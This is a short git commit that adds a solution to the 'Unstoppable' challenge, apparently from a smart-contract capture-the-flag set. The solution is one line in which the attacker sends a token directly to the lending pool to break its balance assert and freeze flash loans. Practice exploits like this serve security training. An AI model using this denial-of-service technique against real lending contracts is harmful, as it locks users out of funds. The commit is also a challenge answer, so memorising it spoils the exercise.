1e08021d5ee6d3bcaa71bfd084041a7b09589856
Mario Poneder <m.poneder@decentra.vision>
2022-02-20 17:33:28 +0100

    Solved challenge #1 Unstoppable

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+		
+		// directly transfer 1 DVT token to lending pool to break "assert(poolBalance == balanceBefore)"
+		await this.token.connect(attacker).transfer(this.pool.address, 1);
     });
 
     after(async function () {
